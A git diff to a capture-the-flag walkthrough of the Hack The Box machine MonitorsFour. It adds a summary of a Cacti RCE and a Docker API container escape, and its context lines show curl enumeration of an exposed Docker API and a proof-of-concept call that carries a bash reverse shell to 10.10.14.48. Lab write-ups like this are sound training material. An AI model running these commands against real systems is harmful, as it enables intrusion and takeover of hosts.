@@ -15,6 +15,12 @@ type: "post"
 * OS: Windows
 ---
 
+MonitorsFour starts with the enumeration of a web application and the discovery of a vulnerable endpoint allowing the disclosure of user information. The recovered credentials provide access to both the main interface and a Cacti instance used for network monitoring.
+
+Analysis of the Cacti instance reveals `CVE-2025-24367`, a vulnerability allowing remote code execution. Exploitation of the flaw leads to initial access within a Docker container hosted on a Windows machine.
+
+Further enumeration of the target identifies an exposed and unauthenticated Docker API. Analysis of the Docker environment reveals `CVE-2025-9074`, a vulnerability allowing the execution of privileged commands on the host through the Docker Engine API. Exploitation of this flaw ultimately results in container escape and full compromise of the underlying Windows system.
+
 # Scanning
 
 ```
@@ -218,7 +224,7 @@ The hostname is noteworthy, this is a typical container ID. The target is a Wind
 
 We need to escape the container and to access the host system.
 
-Let's collect some network information
+Let's collect some network information.
 
 ![network data](/images/HTB-MonitorsFour/network_data.png)
 
@@ -234,7 +240,7 @@ curl http://192.168.65.7:2375/version
 
 Enumeration of the Docker networking configuration revealed an exposed Docker Remote API accessible at `192.168.65.7:2375`. Querying the `/version` endpoint confirmed unauthenticated access to the Docker daemon. The response identified the environment as Docker Engine Community running on a WSL2-backed Linux kernel (`6.6.87.2-microsoft-standard-WSL2`).
 
-We enumerate the Docker images
+We enumerate the Docker images.
 
 ```
 curl -s http://192.168.65.7:2375/images/json | grep -o '"RepoTags":\[[^]]*\]'
@@ -244,7 +250,7 @@ curl -s http://192.168.65.7:2375/images/json | grep -o '"RepoTags":\[[^]]*\]'
 
 There are three Docker images available on the Docker host. Through research we find that `version 28.3.2` (found after querrying `/version`) correspond to Docker Desktop 4.43.x or newer. Searching for `Docker Desktop 4.43.x cve` we find `CVE-2025-9074`, a vulnerability allowing local containers to execute privileged commands on the host via the Docker Engine API. 
 
-A PoC is available [here](https://github.com/BridgerAlderson/CVE-2025-9074-PoC). The command below will create a new container  
+A PoC is available [here](https://github.com/BridgerAlderson/CVE-2025-9074-PoC). The command below will create a new container.  
 
 ```
 ./cve-2025-9074.sh 192.168.65.7 'bash -c "bash -i >& /dev/tcp/10.10.14.48/9001 0>&1"' 2375
